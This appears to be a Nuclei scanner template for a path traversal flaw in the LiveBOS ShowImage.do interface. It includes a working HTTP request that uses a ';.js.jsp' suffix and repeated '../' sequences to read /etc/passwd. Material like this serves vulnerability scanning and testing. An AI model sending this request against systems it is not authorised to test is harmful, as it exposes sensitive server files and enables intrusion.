# Nuclei Template: LiveBOS ShowImage.do - Arbitrary File Read
**Template ID:** livebos-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`livebos-file-read.yaml`)

## Vulnerability Information & PoC

## Description
An arbitrary file read vulnerability exists in the LiveBOS ShowImage.do interface, which can be exploited to obtain sensitive files from the server.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.wevul.com/2301.html
